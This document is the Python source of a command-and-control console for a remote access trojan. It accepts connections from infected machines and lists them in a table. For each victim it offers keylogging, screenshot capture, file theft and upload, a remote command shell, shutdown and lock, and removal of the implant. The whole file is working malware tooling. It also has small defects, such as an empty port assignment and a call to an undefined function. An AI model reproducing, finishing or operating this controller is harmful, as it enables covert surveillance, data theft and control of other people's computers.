from prettytable import PrettyTable
import threading
import socket
import time
import os
import re

port = #use any open ports must match payload
buffer = 16384

clients = []
clientInfo = []

table = PrettyTable()
table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]

send = lambda data: client.send(bytes(data, "utf-8"))
recv = lambda buf: client.recv(buffer)

def sendAll(data):
    if (isinstance(data, bytes)):
        client.send(bytes(str(len(data)), "utf-8"))
        if (conn_stream()):
            client.send(data)
    else:
        data = str(data, "utf-8")
        send(str(len(data)), "utf-8")
        if (conn_stream()):
            send(data)

def recvAll(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
    return data

def recvAll_Verbose(bufsize):
    data = bytes()

    send("success")
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))
        print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufsize)), end="")
    return data

def conn_stream():
    if (b"success" in client.recv(buffer)):
        return True

def RemoteConnect():
    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    objSocket.bind(("0.0.0.0", port))
    objSocket.listen(socket.SOMAXCONN)

    while (True):
        try:
            conn, address = objSocket.accept()
            clients.append(conn)
            clientInfo.append([address, str(conn.recv(buffer), "utf-8").split("\n")])

        except socket.error:
            objSocket.close()
            del(objSocket)
            RemoteConnect()

def ConnectionCommands():
    print("______________________________________________________")
    print("(Connection Commands)                                 |\n" + \
          "                                                      |")
    print("[clients]         View Connected Clients              |")
    print("[connect <id>]    Connect to Client                   |")
    print("[close <id>]      Terminate Connection                |")
    print("[delete <id>]     Kill Connection & Delete Program    |")
    print("[closeall]        Terminates All Connections          |")
    print("______________________________________________________|")

def ClientCommands():
    print("_______________________________________")
    print("(User Interface Commands)             |\n" + \
          "                                      |")
    print("[-cps] Capture Screenshot      (X)    |")
    print("[-cwp] Change Wallpaper        (X)    |")
    print("______________________________________|")
    print("(System Commands)                     |\n" + \
          "                                      |")
    print("[-vsi] View System Information (X)    |")
    print("[-sdc] Shutdown Computer       (X)    |")
    print("[-rsc] Restart Computer        (X)    |")
    print("[-lkc] Lock Computer           (X)    |")
    print("[-skl] Start KeyLogging        (X)    |")
    print("[-rms] CMD                     (X)    |")
    print("______________________________________|")
    print("(File Commands)                       |\n" + \
          "                                      |")
    print("[-sdf] Send File               (X)    |")
    print("[-rvf] Receive File            (X)    |")
    print("______________________________________|\n")

def SystemInformation():
    print(f"\nConnection ID: <{clients.index(client)}>")
    print(f"Computer:        <{PC_Name}>")
    print(f"Username:        <{PC_Username}>")
    print(f"IP Address:      <{IP_Address}>")
    print(f"System:          <{PC_System}>\n")

def ShutdownComputer():
    send("shutdown")
    print(f"Powering Off PC ~ [{IP_Address}]\n")

def RestartComputer():
    send("restart")
    print(f"Restarting PC ~ [{IP_Address}]\n")

def LockComputer():
    send("lock")
    print(f"Locking PC ~ [{IP_Address}]\n")

def StartKeyLogging():
    send("eyeopener")
    print(f"Starting KeyLogging...\n")

def SendFile():
    localFile = input("\nLocal File Path: ").strip()
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return
        
    send("receive")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as file:
        fileContent = file.read()
        
    start = time.time()

    print("Sending File...")
    sendAll(fileContent)

    if not (str(recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer File\n")
        return

    end = time.time()
    
    print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
        (os.path.basename(localFile)), len(fileContent) / 1024, len(fileContent), end - start))

def ReceiveFile():
    filePath = input("\nRemote File Path: ").replace("/", "\\").strip()
    send("send")
    if (conn_stream()):
        send(filePath)

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return
        
    start = time.time()
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        fileName = filePath.split("\\")[-1]
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation - File is too Large\n")

        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

        end = time.time()
        print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            fileName, len(fileContent) / 1024, len(fileContent), end - start))

    except MemoryError as e:
        print(e)
    
    except: print("[!] Error Receiving File\n")

def CaptureScreenshot():
    send("shuttersound")

    if not (str(recv(buffer), "utf-8") == "valid"):
        print("[!] Unable to Capture Screenshot\n")
        return

    start = time.time()
    print("\nScreenshot Captured")
    try:
        fileContent = recvAll_Verbose(recv(buffer))
        if (fileContent == b"bad_alloc"):
            raise MemoryError("Bad Allocation Error - File May be too Large")

        with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
            ImageFile.write(fileContent)

        end = time.time()
        print("\n\nImage has been Received\nSize: " +
            "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
            len(fileContent) / 1024, len(fileContent), end - start))

    except MemoryError as e:
        print(e)

    except: print("[!] Error Receiving File\n")

def ChangeWallpaper():
    localFile = input("\nChoose Local Image File: ").strip()
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return

    elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png)$"), localFile)):
        print("[!] Invalid File Type - Required: (JPEG, JPG, PNG)\n")
        return

    send("bgChange")
    if (conn_stream()):
        send(os.path.basename(localFile))

    with open(localFile, "rb") as ImageFile:
        fileContent = ImageFile.read()

    print("Sending Image...")
    sendAll(fileContent)

    if not (str(recv(buffer), "utf-8") == "received"):
        print("[!] Unable to Transfer Image\n")
        return

    print("Wallpaper Changed\n")

def RemoteCMD():
    send("giveConsole")
    remoteDirectory = str(recv(buffer), "utf-8")

    while (True):
        try:
            command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
            if (command == "exit"):
                raise KeyboardInterrupt

            elif (command == "cls" or command == "clear"):
                os.system("clear" if os.name == "posix" else "cls")

            elif ("start" in command or "tree" in command or "cd" in command or 
                    "cmd" in command or "powershell" in command):

                print("[!] Unable to use this Command hehe")

            elif (len(command) > 0):
                send(command)
                output = str(recvAll(recv(buffer)), "utf-8")

                if (len(output) == 0):
                    print("No Output ~ Command Executed")
                else:
                    print(output, end="")

        except KeyboardInterrupt:
            send("exit"); print("<Exited Remote CMD>\n")
            break

def adjustTable():
    table.clear_rows()

    for client in clients:
        connection = int(clients.index(client))
        network = client.getpeername()

        table.add_row([
            str(connection),
            clientInfo[connection][1][0],
            network[0] + ":" + str(network[1]),
            clientInfo[connection][1][1],
            clientInfo[connection][1][2],
            clientInfo[connection][1][3]
        ])

def SelectConnection():
    while (True):
        try:
            command = input("\n-> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")
                
            elif (command == "?" or command == "help"):
                ConnectionCommands()

            elif (command == "clients"):
                if (len(clients) == 0):
                    print("<Connections Appear Here>")
                    continue

                temp = []
                for client in clients:
                    try:
                        client.send(b"test")
                        if (client.recv(buffer) == b"success"):
                            continue

                    except ConnectionResetError:
                        temp.append(client)

                for deadClient in temp:
                    dead = int(clients.index(deadClient))

                    if (deadClient in clients):
                        table.del_row(dead)
                        clients.remove(deadClient)
                        del(clientInfo[dead])
                        deadClient.close()
                
                adjustTable()
                if not (len([t for t in table]) == 0):
                    print(table)

            elif (command.split(" ")[0] == "connect"):
                connection = int(command.split(" ")[1])
                client = clients[connection]
                try:
                    client.send(b"test")
                    if (client.recv(buffer) == b"success"):
                        RemoteControl(connection)

                except ConnectionResetError:
                    del(clientInfo[int(clients.index(client))])
                    clients.remove(client)
                    print(f"Failed to Connect: {client.getpeername()[0]}")

            elif (command.split(" ")[0] == "close"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                try:
                    client.send(b"terminate")
                except ConnectionResetError:
                    pass
                finally:
                    print(f"{client.getpeername()[0]} has been Terminated")
                    del(clientInfo[connection])
                    clients.remove(client)
                    client.close()

            elif (command.split(" ")[0] == "delete"):
                connection = int(command.split(" ")[1])
                client = clients[connection]

                if (input(f"Delete Program off Client {clients.index(client)}'s Computer? (y/n): ").lower().strip() == "y"):
                    try:
                        client.send(b"delself")
                        if (str(client.recv(buffer), "utf-8") == "success"):
                            print(f"Program has been Deleted off Remote Computer ~ [{client.getpeername()[0]}]")

                    except ConnectionResetError:
                        print("Lost Connection to Client: " + client.getpeername()[0])

                    finally:
                        del(clientInfo[connection])
                        clients.remove(client)
                        client.close()

            elif (command == "closeall"):
                if (input("Are you sure? (y/n): ").lower() == "y"):
                    try:
                        for client in clients:
                            client.send(b"terminate")
                            client.close()

                    except ConnectionResetError: pass
                    finally:
                        print(f"All Connections Terminated: [{len(clients)}]")
                        clients.clear()

        except (ValueError, IndexError):
            print("Invalid Connection ID")

        except (ConnectionAbortedError, BrokenPipeError):
            print("[Clients Timed Out] - Reconnecting...")
            for client in clients:
                client.close()

            clients.clear()

        except KeyboardInterrupt:
            break

        finally:
            if (len(clients) == 0):
                clientInfo.clear()

def RemoteControl(connection):
    global client, IP_Address, PC_Name, PC_Username, PC_System

    client = clients[connection]
    IP_Address = clientInfo[connection][0][0]
    PC_Name = clientInfo[connection][1][0]
    PC_Username = clientInfo[connection][1][1]
    PC_System = clientInfo[connection][1][2]

    print(f"Connected: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
    while (True):
        try:
            command = input(f"({PC_Name})> ").lower().strip()
            if (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "?" or command == "help"):
                ClientCommands()

            elif (command == "-vsi"):
                SystemInformation()
                
            elif (command == "-sdc"):
                ShutdownComputer()

            elif (command == "-rsc"):
                RestartComputer()
            
            elif (command == "-lkc"):
                LockComputer()

            elif (command == "-skl"):
                StartKeyLogging()

            elif (command == "-hkl"):
                StopKeyLogging()

            elif (command == "-sdf"):
                SendFile()
                
            elif (command == "-rvf"):
                ReceiveFile()

            elif (command == "-cps"):
                CaptureScreenshot()

            elif (command == "-rms"):
                RemoteCMD()

            elif (command == "-cwp"):
                ChangeWallpaper()

        except KeyboardInterrupt:
            print("\n[Keyboard Interrupted ~ Connection Appended]")
            break

        except Exception as e:
            print(f"\n[-] Lost Connection to ({IP_Address})\n" + f"Error Message: {e}")
            clients.remove(client)
            del(clientInfo[connection])
            client.close()
            break

t = threading.Thread(target = RemoteConnect)
t.daemon = True
t.start()

SelectConnection()
